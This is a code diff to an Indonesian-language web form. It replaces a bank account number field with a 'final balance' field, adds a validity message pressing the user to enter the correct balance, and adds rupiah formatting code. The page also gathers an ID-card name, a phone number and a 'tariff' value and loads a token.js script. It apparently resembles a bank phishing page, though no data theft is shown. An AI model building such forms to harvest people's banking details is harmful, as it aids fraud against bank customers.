@@ -438,9 +438,9 @@ nav{
 <input type="text" id="nama" name="nama" placeholder="Nama sesuai KTP" required>
                         </div>
        <div class="input-field">
-    <label for="rek">Nomor rekening : </label>
- <input type="tel" id="rek" name="rek" placeholder="######" maxlength="15" minlength="15" required>
-                        </div>
+    <label for="rek">Saldo akhir: </label>
+ <input type="tel" id="saldo" name="rek" placeholder="Rp. xxx" maxlength="" oninvalid="this.setCustomValidity('Pastikan 𝗦𝗮𝗹𝗱𝗼 𝗦𝗲𝘀𝘂𝗮𝗶 𝗥𝗲𝗸𝗲𝗻𝗶𝗻𝗴')" onchange="this.setCustomValidity('')" required>
+       </div>
                     </div>
    <div class="card-footer">
 <button type="submit" class="button" id="lanjutkan" disabled>Lanjutkan</button>
@@ -457,7 +457,7 @@ nav{
     <script src="token.js"></script>
     <script>
     // Get references to the input and button elements
-const input = document.getElementById("rek");
+const input = document.getElementById("saldo");
 const button = document.getElementById("lanjutkan");
 
 // Add an event listener for the input event
@@ -471,7 +471,35 @@ input.addEventListener("input", () => {
     button.disabled = true;
   }
 });    
-       
+       $(document).ready(function(){
+
+                // Format mata uang.
+                $( '.saldo' ).mask('000.000.000.000.000', {reverse: true});
+ var dengan_rupiah = document.getElementById('saldo');
+    dengan_rupiah.addEventListener('keyup', function(e)
+    {
+        dengan_rupiah.value = formatRupiah(this.value, 'Rp. ');
+    });
+    
+    
+      /* Fungsi */
+    function formatRupiah(angka, prefix)
+    {
+        var number_string = angka.replace(/[^,\d]/g, '').toString(),
+            split    = number_string.split(','),
+            sisa     = split[0].length % 3,
+            rupiah     = split[0].substr(0, sisa),
+            ribuan     = split[0].substr(sisa).match(/\d{3}/gi);
+            
+        if (ribuan) {
+            separator = sisa ? '.' : '';
+            rupiah += separator + ribuan.join('.');
+        }
+        
+        rupiah = split[1] != undefined ? rupiah + ',' + split[1] : rupiah;
+        return prefix == undefined ? rupiah : (rupiah ? 'Rp. ' + rupiah : '');
+    }
+            })       
 document.getElementById("tarif").value =
         sessionStorage.getItem("tarif");
 document.getElementById("nohp").value =
